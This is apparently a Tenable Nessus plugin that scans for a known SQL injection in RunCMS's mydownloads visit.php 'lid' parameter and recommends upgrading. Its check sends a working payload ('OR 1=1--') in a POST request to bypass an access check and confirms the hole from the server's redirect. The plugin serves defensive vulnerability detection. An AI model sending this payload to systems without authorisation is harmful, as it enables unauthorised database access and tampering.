#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");

if (description)
{
  script_id(29853);
  script_version("$Revision: 1.18 $");

  script_cve_id("CVE-2007-6544");
  script_bugtraq_id(27019);
  script_osvdb_id(41235, 41236, 41237, 41238, 41239, 41240);
  script_xref(name:"EDB-ID", value:"4787");
  script_xref(name:"EDB-ID", value:"4790");

  script_name(english:"RunCMS Multiple Script lid Parameter SQL Injection");
  script_summary(english:"Tries to bypass XoopsDownload::isAccessible()");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to a SQL
injection attack." );
 script_set_attribute(attribute:"description", value:
"The version of this software installed on the remote host fails to
sanitize user-supplied input to the 'lid' parameter of the
'modules/mydownloads/visit.php' script before using it in a database
query.  Regardless of PHP's 'magic_quotes_gpc' and 'register_globals'
settings, an attacker may be able to exploit this issue to manipulate
database queries, leading to disclosure of sensitive information,
modification of data, or attacks against the underlying database. 

The application is also reportedly affected by similar issues in
several other scripts, although Nessus has not tested for them." );
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2007/Dec/296" );
  # http://web.archive.org/web/20081006154503/http://www.runcms.org/modules/news/article_storyid_32.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?dc35f905" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to RunCMS version 1.6.1 or later." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(89);
 script_set_attribute(attribute:"plugin_publication_date", value: "2008/01/07");
 script_cvs_date("$Date: 2016/11/02 14:37:09 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:runcms:runcms");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2016 Tenable Network Security, Inc.");

  script_dependencies("runcms_detect.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/runcms");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);


# Test an install.
install = get_kb_item(string("www/", port, "/runcms"));
if (isnull(install)) exit(0);
matches = eregmatch(string:install, pattern:"^(.+) under (/.*)$");
if (!isnull(matches))
{
  dir = matches[2];

  # Make sure the script exists.
  url = string(dir, "/modules/mydownloads/visit.php");

  r = http_send_recv3(method:"GET", item:url, port:port);
  if (isnull(r)) exit(0);
  res = r[2];

  # If so...
  if (
    'http-equiv="Refresh" content="' >< res &&
    '/modules/mydownloads" />' >< res
  )
  {
    # Try a couple of times to find an inaccessible / nonexistent lid.
    #
    # nb: this will probably work the first time.
    tries = 5;
    for (iter=1; iter<=tries; iter++)
    {
      lid = rand();

      r = http_send_recv3(method:"GET", item:string(url, "?lid=", lid), port:port);
      if (isnull(r)) exit(0);
      res = r[2];

      # If it's inaccessible / nonexistent...
      if (
        'http-equiv="Refresh" content="' >< res &&
        '/user.php" />' >< res
      )
      {
        # Now try to bypass the XoopsDownload::isAccessible() check.
        exploit = string(lid, " OR 1=1--");
        exploit = str_replace(find:" ", replace:"%20", string:exploit);
        postdata = string("lid=", exploit);

        r = http_send_recv3(method:"POST", item: url, port: port,
	  content_type: "application/x-www-form-urlencoded", data: postdata);
	if (isnull(r)) exit(0);
	res = r[2];

        # There's a problem if...
        if (
          # we see a redirect to an empty URL or...
          'http-equiv="Refresh" content="0; URL=" />' >< res ||
          # we see an error because we didn't pass in a referer.
          (
            'http-equiv="Refresh" content="' >< res &&
            '/modules/mydownloads/singlefile.php?lid=0' >< res
          )
        )
        {
          security_hole(port);
	  set_kb_item(name: 'www/'+port+'/SQLInjection', value: TRUE);
          exit(0);
        }
      }
    }
  }
}
